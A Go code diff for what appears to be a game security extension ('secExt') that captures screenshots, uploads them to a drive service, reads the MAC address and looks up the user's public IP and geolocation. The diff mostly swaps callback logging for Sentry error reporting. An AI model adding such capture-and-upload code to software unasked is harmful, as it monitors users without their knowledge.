@@ -25,6 +25,7 @@ import (
 	"github.com/hajimehoshi/go-steamworks"
 	"github.com/kbinani/screenshot"
 	"github.com/mitchellh/go-ps"
+	"github.com/rdegges/go-ipify"
 	"tawesoft.co.uk/go/dialog"
 
 	"bytes"
@@ -60,7 +61,7 @@ func getMacAddr() (addr string) {
 	interfaces, err := net.Interfaces()
 	if err == nil {
 		for _, i := range interfaces {
-			if i.Flags&net.FlagUp != 0 && bytes.Compare(i.HardwareAddr, nil) != 0 {
+			if i.Flags&net.FlagUp != 0 && !bytes.Equal(i.HardwareAddr, nil) {
 				addr = i.HardwareAddr.String()
 				break
 			}
@@ -77,7 +78,7 @@ func makeScreenshot(basePath string) {
 
 		img, err := screenshot.CaptureRect(bounds)
 		if err != nil {
-			runExtensionCallback(C.CString("secExt"), C.CString("success"), C.CString("makeScreen | Capture "+err.Error()))
+			SendSentry("makeScreen | Capture " + err.Error())
 			break
 		}
 		t := time.Now()
@@ -118,7 +119,7 @@ func ensureDir(fileName string) {
 	if _, serr := os.Stat(dirName); serr != nil {
 		merr := os.MkdirAll(dirName, os.ModePerm)
 		if merr != nil {
-			runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("ensureDir | "+merr.Error()))
+			SendSentry("ensureDir | " + merr.Error())
 		}
 	}
 }
@@ -128,17 +129,15 @@ func isAdmin() int {
 	defer file.Close()
 
 	if err != nil {
-		fmt.Println("admin no")
 		return 0
 	}
-	fmt.Println("admin yes")
 	return 1
 }
 
 func cleanOldFiles() {
 	files, err := ioutil.ReadDir(os.TempDir())
 	if err != nil {
-		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("cleanOldFiles | error open directory"))
+		SendSentry("cleanOldFiles | error open directory")
 	}
 	for _, elem := range files {
 		matched, _ := regexp.MatchString("Screen", elem.Name())
@@ -146,8 +145,7 @@ func cleanOldFiles() {
 			runExtensionCallback(C.CString("secExt"), C.CString("success"), C.CString("cleanOldFiles | find file to delete "+elem.Name()))
 			err := os.Remove(os.TempDir() + "/" + elem.Name())
 			if err != nil {
-				runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("cleanOldFiles | "+err.Error()))
-				SendSentry(err.Error())
+				SendSentry("cleanOldFiles | " + err.Error())
 			}
 		}
 	}
@@ -157,20 +155,18 @@ func cleanTemp() {
 	path := os.TempDir() + "/chrome_drag0947_254420441/dir/"
 	err := os.RemoveAll(path)
 	if err != nil {
-		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("getGeoIp | "+err.Error()))
-		SendSentry(err.Error())
+		SendSentry("getGeoIp | " + err.Error())
 
 	}
 }
 
 func getGeoIp() string {
 	client := goip.NewClient()
-	res, err := client.GetLocationForIp(returnMyData("get_IP", nil))
+	res, err := client.GetLocationForIp(GetIp())
 
 	defer res.Close()
 	if err != nil {
-		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("getGeoIp | "+returnMyData("get_IP", nil)+" limit querys reached for this address"))
-		SendSentry(err.Error())
+		SendSentry("getGeoIp | " + err.Error())
 	}
 
 	return fmt.Sprintf(`["%s","%s","%s","%s","%s","%s"]`,
@@ -180,6 +176,14 @@ func getGeoIp() string {
 		res.Region,
 		res.RegionName,
 		res.Zip)
+}
+
+func GetIp() string {
+	ip, err := ipify.GetIp()
+	if err != nil {
+		return "Cant get ip"
+	}
+	return ip
 }
 
 func uploadScrennshot(basepath string, name string, img *image.RGBA) {
@@ -194,8 +198,7 @@ func uploadScrennshot(basepath string, name string, img *image.RGBA) {
 	runExtensionCallback(C.CString("secExt"), C.CString("success"), C.CString("uploadScreen | file "+filename))
 	imgW, err := os.Create(filename)
 	if err != nil {
-		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("uploadScreen | Create file "+err.Error()))
-		SendSentry(err.Error())
+		SendSentry("uploadScreen | Create file " + err.Error())
 
 	}
 	defer imgW.Close()
@@ -204,8 +207,7 @@ func uploadScrennshot(basepath string, name string, img *image.RGBA) {
 	png.Encode(imgW, img)
 	_img, err := ioutil.ReadFile(filename)
 	if err != nil {
-		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("uploadScreen | Read file "+err.Error()))
-		SendSentry(err.Error())
+		SendSentry("uploadScreen | Read file " + err.Error())
 	}
 
 	imgR := bytes.NewReader(_img)
@@ -216,8 +218,7 @@ func uploadScrennshot(basepath string, name string, img *image.RGBA) {
 	}).Media(imgR).Do()
 
 	if err != nil {
-		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("uploadScreen | Drive file "+err.Error()))
-		SendSentry(err.Error())
+		SendSentry("uploadScreen | Drive file " + err.Error())
 	}
 }
 
